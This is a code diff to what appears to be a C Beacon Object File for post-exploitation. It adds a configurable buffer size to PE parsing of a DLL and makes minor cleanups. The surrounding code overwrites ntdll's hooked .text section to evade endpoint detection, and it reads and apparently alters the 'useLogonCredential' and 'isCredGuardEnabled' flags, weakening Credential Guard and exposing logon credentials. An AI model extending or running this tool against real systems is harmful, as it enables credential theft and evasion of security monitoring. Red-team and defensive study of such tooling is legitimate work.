@@ -422,8 +422,11 @@ bool ParsePEFile(BYTE* buffer, size_t bufferSize, int* offset, int* useLogonCred
     memset(matchedBytes, 0, 18);
 
     // PE header location
-    int peHeaderOffset = *(int32_t*)(buffer + 0x3C);
+    uint32_t peHeaderOffset = *(int32_t*)(buffer + 0x3C);
     uint32_t peSignature = *(uint32_t*)(buffer + peHeaderOffset);
+
+    internal_printf("[+] peSignature:\t\t0x%08llx\n", peSignature);
+
     if (peSignature != 0x00004550) {
         internal_printf("Not a valid PE file.\n");
         return false;
@@ -467,8 +470,8 @@ bool ParsePEFile(BYTE* buffer, size_t bufferSize, int* offset, int* useLogonCred
 }
 
 
-BYTE* ReadDLL(HANDLE fileHandle) {
-    BYTE* fileBytes = (BYTE*)malloc(1024 * 1024); // 1 MB
+BYTE* ReadDLL(HANDLE fileHandle, SIZE_T bufferSize) {
+    BYTE* fileBytes = (BYTE*)malloc(bufferSize);
     if (!fileBytes) {
         internal_printf("Failed to allocate memory for fileBytes.\n");
         return NULL;
@@ -486,7 +489,7 @@ BYTE* ReadDLL(HANDLE fileHandle) {
         NULL,
         &ioStatusBlock,
         fileBytes,
-        1024 * 1024,
+        bufferSize,
         &byteOffset,
         NULL
     );
@@ -685,7 +688,6 @@ LPVOID MapNtdllFromDebugProc(LPCSTR process_path) {
     return pNtdllBuffer;
 }
 
-
 // Overwrite hooked ntdll .text section with a clean version
 void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_T localNtdllTxtSize) {
     ULONG dwOldProtection;
@@ -708,7 +710,6 @@ void ReplaceNtdllTxtSection(LPVOID unhookedNtdllTxt, LPVOID localNtdllTxt, SIZE_
         return;
     }
 }
-
 
 void RemapNtdll(bool debug) {
     const char* targetDll = "ntdll.dll";
@@ -749,6 +750,7 @@ void exec(DWORD option, bool debug) {
     }
 
     HANDLE fileHandle;
+    SIZE_T bufferSize = 1024 * 1024; //default: 1MB
 
     // Open file
     bool openfile_bool = OpenFile(filePath, &fileHandle);
@@ -757,7 +759,7 @@ void exec(DWORD option, bool debug) {
     }
 
     // Read bytes
-    BYTE* fileBuffer = ReadDLL(fileHandle);
+    BYTE* fileBuffer = ReadDLL(fileHandle, bufferSize);
     if (fileBuffer == NULL) {
         internal_printf("[-] Failed to read DLL.\n");
         return;
@@ -769,7 +771,7 @@ void exec(DWORD option, bool debug) {
     BYTE matchedBytes[18] = { 0 };
 
     // Parse PE File
-    bool parse_bool = ParsePEFile(fileBuffer, 1024 * 1024, &offset, &useLogonCredential, &isCredGuardEnabled, matchedBytes);
+    bool parse_bool = ParsePEFile(fileBuffer, bufferSize, &offset, &useLogonCredential, &isCredGuardEnabled, matchedBytes);
     if (!parse_bool) {
         internal_printf("[-] Failed to parse PE file.\n");
         return;
@@ -824,7 +826,6 @@ void exec(DWORD option, bool debug) {
         }
     }
 
-
     // Read
     BYTE useLogonCredential_buffer[4] = { 0 };
     BYTE isCredGuardEnabled_buffer[4] = { 0 };
@@ -840,7 +841,6 @@ void exec(DWORD option, bool debug) {
         internal_printf("[+] isCredGuardEnabled value: \t%02X %02X %02X %02X\n", isCredGuardEnabled_buffer[0], isCredGuardEnabled_buffer[1], isCredGuardEnabled_buffer[2], isCredGuardEnabled_buffer[3]);
     }
 
-
     if (fileHandle != NULL) {
         NtClose(fileHandle);
     }
@@ -852,8 +852,7 @@ void exec(DWORD option, bool debug) {
 #ifdef BOF
 void go(char* args, int len)
 {
-
-	CHAR* flag;
+    CHAR* flag;
     bool debug = true;
 	datap parser;
 
